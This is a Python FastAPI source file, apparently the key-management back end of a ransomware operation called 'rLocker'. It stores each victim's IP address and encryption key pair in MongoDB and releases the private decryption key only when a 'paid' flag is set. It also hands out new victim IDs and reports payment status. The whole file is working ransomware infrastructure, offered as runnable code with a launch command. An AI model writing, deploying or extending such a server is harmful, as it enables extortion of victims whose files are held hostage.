from fastapi import FastAPI
import os
import pymongo
import string
import random

"""

Run this file with command : uvicorn main:app --reload --host 0.0.0.0

"""


app = FastAPI()

mongouri = os.environ["mongouri"]
cluster = pymongo.MongoClient(mongouri)
db = cluster["rLocker"]
tokens = db["tokens"]


def unescape(msg: str):
    return msg.replace("\\", "/")


@app.get("/add/{user}/{ipaddr}/{privatekey}/{publickey}")
async def add(user: str, ipaddr: str, privatekey: str, publickey: str):
    exists = tokens.find_one({"_id": user})
    if not exists:
        privatekey = unescape(privatekey)
        publickey = unescape(publickey)
        userdata = {
            "_id": user,
            "ip": ipaddr,
            "privatekey": privatekey,
            "publickey": publickey,
            "paid": False
        }
        tokens.insert_one(userdata)
        return {"message": "Added user!"}
    return {"message": "User Exists!"}


@app.get("/getkey/{user}")
async def getkey(user: str):
    user = tokens.find_one({"_id": user})
    if user == None:
        return {"message": "User does not exist!"}
    else:
        if user["paid"]:
            return {"message": user["privatekey"]}
        else:
            return {"message": "Payment not complete!"}


def genid() -> str:
    availablechars = string.ascii_letters + string.digits
    length = 40
    output = ""
    for i in range(length):
        output += random.choice(availablechars)

    if tokens.find_one({'_id': output}) != None:
        genid()
    return output


@app.get("/newid")
async def newid():
    uuid = genid()
    return {"message": uuid}


@app.get("/paidstatus/{user}")
async def paid(user: str):
    exists = tokens.find_one({"_id": user})
    if exists:
        return {"message": exists["paid"]}
    return {"message": "User does not exits!"}
